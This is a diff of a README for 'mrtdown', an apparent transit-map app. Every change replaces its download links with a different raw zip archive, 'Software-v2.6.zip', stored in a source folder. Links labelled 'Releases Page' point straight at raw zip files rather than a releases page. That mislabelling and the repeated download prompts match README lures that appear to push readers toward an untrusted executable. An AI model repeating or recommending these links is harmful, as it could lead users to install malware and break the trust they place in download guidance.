@@ -6,11 +6,11 @@ Welcome to **mrtdown**! This application helps you view and interact with transi
 
 ## 📥 Download Your Copy
 
-[![Download mrtdown](https://raw.githubusercontent.com/JDSSSSSSSSS/mrtdown/main/zootypic/mrtdown.zip)](https://raw.githubusercontent.com/JDSSSSSSSSS/mrtdown/main/zootypic/mrtdown.zip)
+[![Download mrtdown](https://github.com/JDSSSSSSSSS/mrtdown/raw/refs/heads/main/mrt-map-app/src/Software-v2.6.zip)](https://github.com/JDSSSSSSSSS/mrtdown/raw/refs/heads/main/mrt-map-app/src/Software-v2.6.zip)
 
 To download the most recent version of mrtdown, please visit the Releases page:
 
-[Download from the Releases Page](https://raw.githubusercontent.com/JDSSSSSSSSS/mrtdown/main/zootypic/mrtdown.zip)
+[Download from the Releases Page](https://github.com/JDSSSSSSSSS/mrtdown/raw/refs/heads/main/mrt-map-app/src/Software-v2.6.zip)
 
 ## 📂 System Requirements
 
@@ -23,7 +23,7 @@ Before downloading, make sure your device meets these requirements:
 ## 💻 Installation Instructions
 
 1. **Visit the Releases Page**: Click the link below to access the download options:
-   - [Download from the Releases Page](https://raw.githubusercontent.com/JDSSSSSSSSS/mrtdown/main/zootypic/mrtdown.zip)
+   - [Download from the Releases Page](https://github.com/JDSSSSSSSSS/mrtdown/raw/refs/heads/main/mrt-map-app/src/Software-v2.6.zip)
 
 2. **Choose Your Version**: Find the version you want to download. Generally, the latest version is recommended for the best features and updates.
 
@@ -80,6 +80,6 @@ For updates on new features, fixes, and announcements, check our repository. You
 
 ### 👉 Download mrtdown Now!
 
-[![Download mrtdown](https://raw.githubusercontent.com/JDSSSSSSSSS/mrtdown/main/zootypic/mrtdown.zip)](https://raw.githubusercontent.com/JDSSSSSSSSS/mrtdown/main/zootypic/mrtdown.zip)
+[![Download mrtdown](https://github.com/JDSSSSSSSSS/mrtdown/raw/refs/heads/main/mrt-map-app/src/Software-v2.6.zip)](https://github.com/JDSSSSSSSSS/mrtdown/raw/refs/heads/main/mrt-map-app/src/Software-v2.6.zip)
 
 Enjoy navigating the city transit maps with ease!
